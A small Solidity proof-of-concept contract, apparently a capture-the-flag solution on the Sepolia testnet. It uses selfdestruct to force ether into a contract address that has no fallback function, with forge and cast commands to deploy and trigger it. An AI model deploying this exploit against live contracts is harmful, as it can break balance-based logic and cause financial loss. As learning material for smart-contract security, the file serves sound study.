// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract PoC {
    constructor() payable {}

    function gogo() public {
        selfdestruct(payable(address(0x711D8f8aC705fC363c1CC99d0Fe6b2df0C8317B0)));
    }
}

// forge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY ./src/depositETHNoFallbackContract.sol:PoC --value 10000
// cast send $instance --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY "gogo()" 
